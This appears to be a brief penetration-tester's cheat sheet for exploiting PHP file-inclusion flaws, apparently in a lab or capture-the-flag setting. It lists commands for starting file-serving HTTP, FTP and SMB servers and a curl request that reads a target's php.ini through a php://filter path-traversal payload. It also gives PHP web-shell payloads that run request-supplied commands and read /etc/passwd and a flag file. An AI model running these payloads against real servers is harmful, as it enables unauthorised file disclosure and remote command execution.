# Useful Links

# Useful Commands

HTTP Server
```bash
sudo python3 -m http.server <LISTENING_PORT>
```

FTP Server
sudo python3 -m pyftpdlib -p 21

SMB Server
impacket-smbserver -smb2support share $(pwd)

Checking PHP Configurations
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

Base64 PHP Shell
echo '<?php system($_GET["cmd"]); ?>' | base64

# Useful Payloads
<?php file_get_contents('/etc/passwd'); ?>
<?php system('cat /flag.txt'); ?>
<?php system($_REQUEST['cmd']); ?>
